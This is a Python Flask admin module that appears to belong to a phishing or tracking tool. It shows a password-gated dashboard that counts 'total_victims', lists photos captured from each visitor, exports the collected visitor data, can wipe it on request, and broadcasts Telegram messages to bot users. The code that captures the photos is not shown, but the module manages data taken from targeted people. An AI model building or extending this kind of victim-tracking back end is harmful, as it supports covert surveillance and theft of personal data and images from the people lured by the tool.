from flask import Blueprint, request, session, redirect, url_for, render_template_string, jsonify

from config import config
from core.storage import load_json, save_json, PHOTO_DIR
import os
import threading

from templates.admin_login import LOGIN_PAGE
from templates.admin_dashboard import ADMIN_DASHBOARD

bp = Blueprint('admin', __name__)


@bp.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and 'login' in request.form:
        if (request.form.get('username') == config['admin_username'] and
                request.form.get('password') == config['admin_password']):
            session['admin'] = True
            return redirect(url_for('admin.admin'))
        return render_template_string(LOGIN_PAGE, error='Invalid credentials')

    if not session.get('admin'):
        return render_template_string(LOGIN_PAGE, error=None)

    if 'logout' in request.args:
        session.pop('admin', None)
        return redirect(url_for('admin.admin'))

    if 'export' in request.args:
        return jsonify(load_json('visitors.json'))

    if 'clear' in request.args:
        save_json('visitors.json', {})
        save_json('links.json', {})
        for f in os.listdir(PHOTO_DIR):
            try:
                os.remove(os.path.join(PHOTO_DIR, f))
            except Exception:
                pass
        return redirect(url_for('admin.admin'))

    visitors = load_json('visitors.json')
    links = load_json('links.json')
    users = load_json('users.json')

    photo_files = os.listdir(PHOTO_DIR) if os.path.exists(PHOTO_DIR) else []
    enriched = {}
    for vid, v in visitors.items():
        if not isinstance(v, dict):
            continue
        row = dict(v)
        row['photos_list'] = [f for f in photo_files if f.startswith(vid + '_')]
        enriched[vid] = row

    return render_template_string(
        ADMIN_DASHBOARD,
        visitors=enriched,
        links=links,
        users=users,
        total_victims=len(enriched),
        total_photos=sum(v.get('photos', 0) for v in enriched.values()),
        total_users=len(users),
    )


@bp.route('/admin_broadcast', methods=['POST'])
def admin_broadcast():
    if not session.get('admin'):
        return redirect(url_for('admin.admin'))
    text = request.form.get('message', '').strip()
    if not text:
        return redirect(url_for('admin.admin'))

    from core.storage import load_json
    from core.telegram import send_message
    import time as _t

    def _worker(txt):
        users = load_json('users.json')
        for uid in users:
            send_message(uid, txt, parse_mode=None)
            _t.sleep(0.05)

    threading.Thread(target=_worker, args=(text,), daemon=True).start()
    return redirect(url_for('admin.admin'))